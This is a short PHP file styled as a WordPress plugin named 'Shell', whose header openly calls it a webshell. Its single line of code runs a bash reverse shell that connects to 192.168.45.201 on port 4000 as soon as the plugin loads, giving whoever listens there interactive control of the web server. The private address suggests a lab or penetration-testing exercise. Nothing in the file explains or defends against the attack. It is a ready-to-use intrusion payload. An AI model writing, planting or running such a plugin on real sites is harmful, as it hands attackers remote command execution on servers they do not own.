<?php
/**
* Plugin Name: Shell
* Plugin URI: http://empty
* Description: Wordpress webshell
* Version: 1.0
* Author: emanuele
* Author URI: http://empty
* License: https://nosuchlicense
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.201/4000 0>&1'")

?>
